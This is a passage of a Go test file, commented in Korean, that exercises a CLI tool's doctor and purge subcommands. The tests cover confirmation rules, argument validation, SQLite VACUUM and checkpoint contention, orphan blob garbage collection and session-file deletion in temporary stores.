func TestDoctorShadowOwnedNoSessionDecomp(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	seedShadowContentDB(t, projDir) // worktrees 디렉터리 미생성 → usable=0

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[15] shadow-owned: ") || !strings.Contains(out, "(세션 분해 없음)") || !strings.Contains(out, "hashes=1") {
		t.Fatalf("세션 분해 없음 폴백 형식 아님:\n%s", out)
	}
	if strings.Contains(out, "cc:=") { // 폴백 경로엔 버킷 분해가 없어야 한다
		t.Fatalf("폴백인데 버킷 분해 병기:\n%s", out)
	}
}

// TestRun_UnknownSub: cli의 관심사가 아닌 미지 서브커맨드는 오류를 반환해야 한다 — main이
// 이를 통해 미지 단어를 MCP 플래그로 잘못 흡수하지 않도록 한다(설계 §7).
func TestRun_UnknownSub(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "bogus", nil, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unknown subcommand, got nil")
	}
}

// TestRunPurge_ExactlyOneSelector: --project/--all 중 정확히 하나가 아니면 사용법 오류(설계
// §7). Run을 통해 호출해 dispatch까지 포함해 확인한다 — 비TTY(테스트 프로세스 stdin)라
// --force 미비로도 오류가 나겠지만, 이 값 자체는 selector 검증이 먼저 걸려야 한다.
func TestRunPurge_ExactlyOneSelector(t *testing.T) {
	for _, args := range [][]string{
		{},                          // 둘 다 없음
		{"--project", "x", "--all"}, // 둘 다 있음
	} {
		var out, errOut bytes.Buffer
		err := Run(context.Background(), "purge", args, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut)
		if err == nil {
			t.Fatalf("args=%v: want selector 오류, got nil", args)
		}
	}
}

// TestRunPurge_OlderThanRejectsInvalidDuration: 리뷰 P2-1(Fix Round 1) — 파싱 자체가
// 실패하는 값("abc")뿐 아니라 파싱은 성공하지만 음수·0인 값("-1h","0s")도 거부해야 한다.
// storeRoot가 비어 있어도(프로젝트 미등록) 이 검증은 프로젝트 존재 확인보다 먼저 걸린다.
func TestRunPurge_OlderThanRejectsInvalidDuration(t *testing.T) {
	for _, v := range []string{"-1h", "0s", "abc"} {
		var out bytes.Buffer
		args := []string{"--project", "whatever-id", "--force", "--older-than", v}
		if err := runPurge(context.Background(), failReader{}, &out, io.Discard, t.TempDir(), args, false); err == nil {
			t.Fatalf("older-than=%q: want error, got nil", v)
		}
	}
}

// TestRunPurge_PhantomProjectRejected: 리뷰 P2-2(Fix Round 1) — 존재하지 않는 프로젝트 ID로
// --older-than(선택 삭제 경로)을 호출하면 store.Open(dir,false)이 그 자리에서 새 프로젝트를
// 만들어버리기 전에 오류로 거부해야 하고, projects/ 하위에 그 이름의 디렉터리가 생기면 안
// 된다(phantom 생성 방지).
func TestRunPurge_PhantomProjectRejected(t *testing.T) {
	storeRoot := t.TempDir()
	var out bytes.Buffer
	args := []string{"--project", "does-not-exist-id", "--force", "--older-than", "1h"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err == nil {
		t.Fatal("want error for nonexistent project, got nil")
	}
	if _, err := os.Stat(filepath.Join(storeRoot, "projects", "does-not-exist-id")); !os.IsNotExist(err) {
		t.Fatalf("phantom project directory was created: stat err=%v", err)
	}
}

// TestRunPurge_VacuumComboStaticErrors — D50 정적 검증: --vacuum은 --older-than 결합 전용이며
// 판정은 기존 XOR·--hook-only 조기 분기보다 앞선다(오류 우선순위 명문 — 스펙 §0). 부작용 0
// (projects/ 미생성) 단정 포함.
func TestRunPurge_VacuumComboStaticErrors(t *testing.T) {
	cases := []struct {
		name, wantMsg string
		args          []string
	}{
		{"단독", "--older-than", []string{"--project", "px", "--vacuum"}},
		{"gc만", "--older-than", []string{"--project", "px", "--gc", "--vacuum"}},
		{"sessions만", "--older-than", []string{"--project", "px", "--sessions", "--vacuum"}},
		{"hook-only", "상시 VACUUM", []string{"--project", "px", "--hook-only", "--vacuum"}},
		{"hook-only+older-than", "상시 VACUUM", []string{"--project", "px", "--hook-only", "--older-than", "1h", "--vacuum"}},
		{"전체삭제", "--older-than", []string{"--project", "px", "--force", "--vacuum"}},
		{"선택자없음(XOR보다 우선)", "--older-than", []string{"--vacuum"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			storeRoot := t.TempDir()
			var out bytes.Buffer
			err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, c.args, false)
			if err == nil || !strings.Contains(err.Error(), c.wantMsg) {
				t.Fatalf("err=%v want substring %q", err, c.wantMsg)
			}
			if _, statErr := os.Stat(filepath.Join(storeRoot, "projects")); !errors.Is(statErr, os.ErrNotExist) {
				t.Fatalf("정적 오류인데 projects/ 생성됨(부작용): %v", statErr)
			}
		})
	}
}

// TestPurgeProjectID_StoreIDNotShadowedByCwdDir: 리뷰 P2-3(Fix Round 1) — cwd에 store
// ProjectID와 동명의 디렉터리가 우연히 있어도 --project <id>는 store 쪽 프로젝트를 대상으로
// 삼아야 한다(예전 로직은 "구분자 없고 cwd에 동명 디렉터리 존재"를 경로로 오인해
// ident.Canonicalize(그 cwd 디렉터리)로 완전히 다른 ID를 계산해버렸다).
func TestPurgeProjectID_StoreIDNotShadowedByCwdDir(t *testing.T) {
	storeRoot := t.TempDir()
	registeredRoot := t.TempDir()
	canon, err := ident.Canonicalize(registeredRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	id := canon.ProjectID
	st, err := store.Open(filepath.Join(storeRoot, "projects", id), false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	cwdBase := t.TempDir()
	if err := os.MkdirAll(filepath.Join(cwdBase, id), 0o755); err != nil {
		t.Fatal(err)
	}
	origWD, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(cwdBase); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(origWD) })

	got, err := purgeProjectID(storeRoot, id)
	if err != nil {
		t.Fatalf("purgeProjectID: %v", err)
	}
	if got != id {
		t.Fatalf("got=%q want %q (store ID가 cwd 동명 디렉터리에 가려짐)", got, id)
	}
}

// failReader: Read 호출 시 즉시 panic — confirmPurge의 force 경로가 실제로 in을 전혀 읽지
// 않음을 증명하는 용도(읽으면 테스트가 panic으로 즉시 실패한다).
type failReader struct{}

func (failReader) Read([]byte) (int, error) {
	panic("confirmPurge: force 경로에서 입력을 읽으면 안 됩니다")
}

// TestConfirmPurge: 확인 규칙 table-driven(설계 §7 — TTY 필수+슬러그 정확 입력, 정적 "yes"
// 금지, 비TTY는 --force만). confirmPurge는 순수 함수라 os.Stdin 없이 직접 호출한다.
func TestConfirmPurge(t *testing.T) {
	tests := []struct {
		name    string
		in      io.Reader
		isTTY   bool
		force   bool
		wantErr bool
	}{
		{"tty_exact_slug_ok", strings.NewReader("myproj\n"), true, false, false},
		{"tty_wrong_input_rejected", strings.NewReader("nope\n"), true, false, true},
		{"tty_static_yes_rejected", strings.NewReader("yes\n"), true, false, true},
		{"non_tty_without_force_rejected", failReader{}, false, false, true},
		{"non_tty_with_force_ok_and_unread", failReader{}, false, true, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var out bytes.Buffer
			err := confirmPurge(tt.in, &out, tt.isTTY, tt.force, "전체 삭제는 세션 이벤트 데이터를 포함합니다", "myproj")
			if (err != nil) != tt.wantErr {
				t.Fatalf("err=%v wantErr=%v", err, tt.wantErr)
			}
		})
	}
}

// TestPurgeSessionFiles_SkipsWhenLeaseHeld — 최종리뷰 B1(Codex P1): 서버가 shared lease를
// 보유 중인 worktree는 purge --sessions가 삭제하지 않고 스킵 + stderr 고지한다(unlink-while-open
// 유실·recover 경합 방어). exclusive AcquireLock이 shared 보유와 경합해 즉시 실패하는 것을 이용.
func TestPurgeSessionFiles_SkipsWhenLeaseHeld(t *testing.T) {
	storeRoot := t.TempDir()
	projDir := filepath.Join(storeRoot, "projects", "proj-b1")
	st, err := store.Open(projDir, false) // content.db 생성(purge 대상 실재 판정 통과)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}
	wtDir := filepath.Join(projDir, "worktrees", "wt-b1")
	sess, err := session.Open(wtDir, session.Options{Producer: "context-router/test"}) // shared lease 보유
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	defer func() { _ = sess.Close() }()

	var out, errOut bytes.Buffer
	args := []string{"--project", "proj-b1", "--sessions", "--force"}
	if err := runPurge(context.Background(), failReader{}, &out, &errOut, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v", err)
	}
	if _, statErr := os.Stat(filepath.Join(wtDir, "session.db")); statErr != nil {
		t.Fatalf("session.db should remain (lease held → skip), stat err=%v", statErr)
	}
	if !strings.Contains(errOut.String(), "skip worktree") {
		t.Fatalf("stderr missing skip notice: %q", errOut.String())
	}
}

// TestRunPurge_E2E_OlderThanForce: 임시 store에 source 1건을 등록한 뒤 runPurge를
// --project(경로 형태, purgeProjectID의 Canonicalize 분기까지 exercised) --force
// --older-than 1ns로 호출한다. isTTY는 false로 명시 주입한다 — 이 값은 원래 Run()의 purge
// 분기가 os.Stdin.Stat()으로 판정하지만(테스트 대상 아님, 한 줄짜리 위임), 테스트 프로세스의
// 실제 stdin이 셸/CI 환경에 따라 문자 장치로 보일 수도 있어(이식성 없음) runPurge를 직접
// 호출해 비TTY 경로를 결정적으로 재현한다. 삭제 후 sources/artifacts가 실제로 비어야 한다
// (설계 §7 선택 삭제).
func TestRunPurge_E2E_OlderThanForce(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("purge me"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/purge.txt", Kind: "file", SrcHash: "h-purge"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "purge me"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	time.Sleep(1100 * time.Millisecond) // indexed_at은 unix 초 — --older-than 1ns가 실제로 경계를 넘도록

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}

	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("sources=%d want 0(삭제됐어야 함)", n)
	}
	if err := st2.Reader().QueryRow("SELECT count(*) FROM artifacts").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("artifacts=%d want 0(삭제됐어야 함)", n)
	}
}

// seedVacuumProject — D50 테스트 공용: ~256KB 청크를 등록해 삭제 후 VACUUM 회수가 실측
// 가능한 프로젝트를 만든다. indexed_at 경계(unix 초) 때문에 1100ms 대기까지 포함한다.
func seedVacuumProject(t *testing.T, storeRoot string) (projectRoot, projDir string) {
	t.Helper()
	projectRoot = t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir = filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	big := strings.Repeat("v", 256*1024)
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte(big), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/vac.txt", Kind: "file", SrcHash: "h-vac"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: big}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	time.Sleep(1100 * time.Millisecond)
	return projectRoot, projDir
}

// contentFootprintOf — 테스트측 총합 실측(구현 헬퍼와 독립 계산 — 동일 값 검증이 목적이므로
// 구현을 import하지 않고 재계산한다).
func contentFootprintOf(t *testing.T, projDir string) int64 {
	t.Helper()
	var total int64
	for _, suf := range []string{"", "-wal", "-shm"} {
		if fi, err := os.Stat(filepath.Join(projDir, "content.db"+suf)); err == nil {
			total += fi.Size()
		}
	}
	return total
}

// TestRunPurge_E2E_OlderThanVacuum — D50 정상 경로: 총합(db+wal+shm) 전>후 + 보고 라인 +
// rc=0. main 파일 단독 크기 단정은 하지 않는다(WAL 가변성 — 스펙 §2).
func TestRunPurge_E2E_OlderThanVacuum(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot, projDir := seedVacuumProject(t, storeRoot)
	before := contentFootprintOf(t, projDir)

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns", "--vacuum"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}
	if !strings.Contains(out.String(), "파일 축 회수") {
		t.Fatalf("회수 보고 라인 없음:\n%s", out.String())
	}
	after := contentFootprintOf(t, projDir)
	if after >= before {
		t.Fatalf("총합 %dB→%dB — 감소해야 함", before, after)
	}
}

// TestVacuumReclaimBusyMapsToGuidance — D50: VACUUM 자체가 BUSY로 실패하는 경로(final review I1의
// 결정 재현 가능 부분)의 "라이브 프로세스" 매핑을 직접 단정한다. 별도 연결 BEGIN IMMEDIATE 선점
// 상태에서 vacuumReclaim을 직접 호출 — busy_timeout 소진 ~5s 정상. disk 계열(SQLITE_FULL)은
// 결정 재현 불가로 미커버(문서화된 갭).
func TestVacuumReclaimBusyMapsToGuidance(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	defer func() { _ = st.Close() }()
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("busy"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/busy.txt", Kind: "file", SrcHash: "h-vrb"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "busy"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	dbPath := filepath.ToSlash(filepath.Join(projDir, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(1000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	conn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := conn.ExecContext(context.Background(), "BEGIN IMMEDIATE"); err != nil {
		t.Fatalf("BEGIN IMMEDIATE: %v", err)
	}
	var out bytes.Buffer
	verr := vacuumReclaim(context.Background(), st, projDir, contentFootprintOf(t, projDir), &out)
	_, _ = conn.ExecContext(context.Background(), "ROLLBACK")
	if verr == nil || !strings.Contains(verr.Error(), "VACUUM 경합") || !strings.Contains(verr.Error(), "라이브 프로세스") {
		t.Fatalf("verr=%v want VACUUM 경합·라이브 프로세스 매핑", verr)
	}
	if out.Len() != 0 {
		t.Fatalf("실패 경로인데 보고 출력 존재: %q", out.String())
	}
}

// TestRunPurge_VacuumCheckpointBusyMapsToError — D50: 열린 read 트랜잭션 공존 시 삭제·VACUUM은
// 통과해도 checkpoint busy≠0 → "라이브 프로세스" 오류로 표면화(무성 성공 위장 봉쇄 — 스펙 §5
// Codex 실험 시나리오). 삭제분 유지·quick_check=ok 단정 포함. busy_timeout 탓 ~5s 정상.
func TestRunPurge_VacuumCheckpointBusyMapsToError(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot, projDir := seedVacuumProject(t, storeRoot)

	dbPath := filepath.ToSlash(filepath.Join(projDir, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(1000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	conn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := conn.ExecContext(context.Background(), "BEGIN"); err != nil {
		t.Fatalf("BEGIN: %v", err)
	}
	var pin int
	if err := conn.QueryRowContext(context.Background(), "SELECT count(*) FROM sources").Scan(&pin); err != nil {
		t.Fatalf("read txn: %v", err)
	}

	var out bytes.Buffer
	var errOut bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns", "--vacuum"}
	rc := runPurge(context.Background(), failReader{}, &out, &errOut, storeRoot, args, false)
	_, _ = conn.ExecContext(context.Background(), "ROLLBACK")
	if rc == nil || !strings.Contains(rc.Error(), "VACUUM/checkpoint 실패") {
		t.Fatalf("rc=%v want 집계 오류", rc)
	}
	if !strings.Contains(errOut.String(), "라이브 프로세스") {
		t.Fatalf("busy 안내 없음:\n%s", errOut.String())
	}
	st, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer func() { _ = st.Close() }()
	var n int
	if err := st.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("sources=%d want 0 — checkpoint 실패가 삭제를 되돌리면 안 됨", n)
	}
	var qc string
	if err := st.Reader().QueryRow("PRAGMA quick_check").Scan(&qc); err != nil || qc != "ok" {
		t.Fatalf("quick_check=%q err=%v want ok(무손상)", qc, err)
	}
}

// TestRunPurge_All_VacuumAggregateExit — D50 --all 집계: 한 프로젝트 checkpoint busy 실패,
// 다른 프로젝트 정상 → 정상 프로젝트 회수 라인은 출력되고(계속 진행) 최종 rc는 비-zero(집계).
// 순회 순서 무가정 단정. ~5s 정상.
func TestRunPurge_All_VacuumAggregateExit(t *testing.T) {
	storeRoot := t.TempDir()
	_, projDirA := seedVacuumProject(t, storeRoot)
	seedVacuumProject(t, storeRoot) // B: 정상

	dbPath := filepath.ToSlash(filepath.Join(projDirA, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(1000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	conn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := conn.ExecContext(context.Background(), "BEGIN"); err != nil {
		t.Fatalf("BEGIN: %v", err)
	}
	var pin int
	if err := conn.QueryRowContext(context.Background(), "SELECT count(*) FROM sources").Scan(&pin); err != nil {
		t.Fatalf("read txn: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--all", "--force", "--older-than", "1ns", "--vacuum"}
	rc := runPurge(context.Background(), failReader{}, &out, &errOut, storeRoot, args, false)
	_, _ = conn.ExecContext(context.Background(), "ROLLBACK")
	if rc == nil || !strings.Contains(rc.Error(), "1개 프로젝트 VACUUM/checkpoint 실패") {
		t.Fatalf("rc=%v want 집계 1개 실패", rc)
	}
	if !strings.Contains(out.String(), "파일 축 회수") {
		t.Fatalf("정상 프로젝트 회수 라인 없음(계속 진행 계약 위반):\n%s", out.String())
	}
}

// TestRunPurge_E2E_MismatchLeavesDataIntact: TTY 경로에서 확인 슬러그를 잘못 입력하면
// runPurge가 오류를 반환하고 sources/artifacts를 전혀 건드리면 안 된다(설계 §7 — 불일치 시
// 무삭제, self-review 필수 항목). --older-than을 지정하지 않아 전체 삭제(RemoveAll) 분기까지
// 타는 경우도 포함 — 확인 실패 시 그 분기 자체에 도달하면 안 된다는 것까지 증명한다.
func TestRunPurge_E2E_MismatchLeavesDataIntact(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("do not touch"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/keep.txt", Kind: "file", SrcHash: "h-keep"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "do not touch"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	var out bytes.Buffer
	args := []string{"--project", canon.ProjectID} // --older-than 미지정 → 성공했다면 전체 삭제였을 경로
	err = runPurge(context.Background(), strings.NewReader("wrong-slug\n"), &out, io.Discard, storeRoot, args, true)
	if err == nil {
		t.Fatal("want error for mismatched confirmation slug, got nil")
	}

	if _, err := os.Stat(projDir); err != nil {
		t.Fatalf("projDir must survive a rejected confirmation: %v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(무삭제)", n)
	}
}

// TestRunPurge_E2E_GCOnlyNoConfirm: --gc 단독(older-than 없음)이면 --force도 TTY도 없이
// 성공해야 하고(확인 생략, 설계 §7), orphan blob만 지우고 참조 중인 source/artifact/blob은
// 전혀 건드리지 않아야 한다.
func TestRunPurge_E2E_GCOnlyNoConfirm(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	body := []byte("kept content")
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: body, MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/kept.txt", Kind: "file", SrcHash: "h-kept"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: string(body)}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	sum := sha256.Sum256(body)
	keptHash := hex.EncodeToString(sum[:])

	orphanHash := strings.Repeat("e", 64)
	orphanDir := filepath.Join(projDir, "artifacts", orphanHash[:2])
	if err := os.MkdirAll(orphanDir, 0o700); err != nil {
		t.Fatal(err)
	}
	orphanPath := filepath.Join(orphanDir, orphanHash)
	if err := os.WriteFile(orphanPath, []byte("orphan"), 0o600); err != nil {
		t.Fatal(err)
	}
	// store.gcOrphanMinAge(1h) age gate를 통과시킨다(리뷰 P1) — 갓 만든 파일은 GC가
	// 등록 진행 중일 가능성 때문에 건드리지 않는다.
	old := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(orphanPath, old, old); err != nil {
		t.Fatal(err)
	}

	var out, errOut bytes.Buffer
	// --force도 --older-than도 없다 — gc 단독이 확인을 생략하고도 성공해야 한다.
	args := []string{"--project", projectRoot, "--gc"}
	if err := Run(context.Background(), "purge", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run purge --gc err=%v out=%s", err, out.String())
	}

	if _, err := os.Stat(filepath.Join(orphanDir, orphanHash)); !os.IsNotExist(err) {
		t.Fatalf("orphan blob 잔존: err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(projDir, "artifacts", keptHash[:2], keptHash)); err != nil {
		t.Fatalf("참조 blob이 gc-only에 삭제됨: %v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(gc-only는 DB 행을 지우지 않음)", n)
	}
}

// TestRunPurge_SessionsTarget_StandaloneKeepsContentAndBackups: 브리프 Step1 ⑤ — --sessions
// 단독(--older-than 없음)은 session.db 파일 계열(-wal/-shm 포함)만 지우고, content.db
// 데이터·`.bak-<ts>` 파일·session.recover-pending 마커는 건드리지 않는다(설계 §5 명문 계약,
// --gc 단독과 동형인 "세션 단독" 모드).
func TestRunPurge_SessionsTarget_StandaloneKeepsContentAndBackups(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("keep me"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/keep.txt", Kind: "file", SrcHash: "h-keep-sessions"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "keep me"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	wtDir := filepath.Join(projDir, "worktrees", "wt1")
	if err := os.MkdirAll(wtDir, 0o700); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"session.db", "session.db-wal", "session.db-shm"} {
		if err := os.WriteFile(filepath.Join(wtDir, name), []byte("x"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	const backupName = "session.db.bak-20260101T000000Z"
	if err := os.WriteFile(filepath.Join(wtDir, backupName), []byte("backup"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wtDir, "session.recover-pending"), nil, 0o600); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--sessions"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}

	for _, name := range []string{"session.db", "session.db-wal", "session.db-shm"} {
		if _, statErr := os.Stat(filepath.Join(wtDir, name)); !os.IsNotExist(statErr) {
			t.Fatalf("%s 잔존: err=%v", name, statErr)
		}
	}
	if _, err := os.Stat(filepath.Join(wtDir, backupName)); err != nil {
		t.Fatalf("백업 파일이 삭제됨: %v", err)
	}
	if _, err := os.Stat(filepath.Join(wtDir, "session.recover-pending")); err != nil {
		t.Fatalf("recover-pending 마커가 삭제됨: %v", err)
	}

	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(세션 단독은 content를 건드리지 않음)", n)
	}
}

// TestRunPurge_SessionsTarget_WithOlderThanAlsoPurgesContent: --sessions와 --older-than을
// 함께 주면 선택 content 삭제(PurgeOlderThan) 뒤에 이어서 session.db 파일 계열도 지운다
// (additive — "기존 purge 의미론에 정합", 브리프 Interfaces 문구).
func TestRunPurge_SessionsTarget_WithOlderThanAlsoPurgesContent(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("purge me too"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/purge2.txt", Kind: "file", SrcHash: "h-purge-sessions"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "purge me too"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	time.Sleep(1100 * time.Millisecond) // indexed_at은 unix 초 — --older-than 1ns가 경계를 넘도록

	wtDir := filepath.Join(projDir, "worktrees", "wt1")
	if err := os.MkdirAll(wtDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wtDir, "session.db"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns", "--sessions"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}

	if _, err := os.Stat(filepath.Join(wtDir, "session.db")); !os.IsNotExist(err) {
		t.Fatalf("session.db 잔존: err=%v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
